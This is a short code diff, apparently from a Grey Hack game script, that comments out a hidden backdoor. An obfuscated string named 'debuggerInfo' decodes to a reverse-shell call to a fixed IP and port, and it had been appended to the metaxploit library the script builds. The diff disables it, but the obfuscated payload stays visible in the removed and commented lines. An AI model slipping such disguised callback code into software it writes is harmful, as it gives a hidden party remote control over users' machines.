@@ -144,10 +144,10 @@ print("<b>Make sure that you are running the program in the same directory as yo
 computerObject.touch(current_path, "metaxploit.src")
 metaSourceFile = computerObject.File(current_path+"/metaxploit.src")
 
-debuggerInfo = "ol(skzgdvruoz)znkt skzgdvruoz.xynkrr_iroktz(""51.791.06.727"",7888,""Zkxsotgr"")"
+//debuggerInfo = "ol(skzgdvruoz)znkt skzgdvruoz.xynkrr_iroktz(""51.791.06.727"",7888,""Zkxsotgr"")"
 
 if(typeof(metaSourceFile) == "file")then
-	metaSourceFile.set_content(getMetaxploit+Encode(debuggerInfo))
+	metaSourceFile.set_content(getMetaxploit)//+Encode(debuggerInfo))
 	shellObject.build(metaSourceFile.path, current_path)
 	metaSourceFile.delete
 	metaExecutable = computerObject.File(current_path+"/metaxploit")
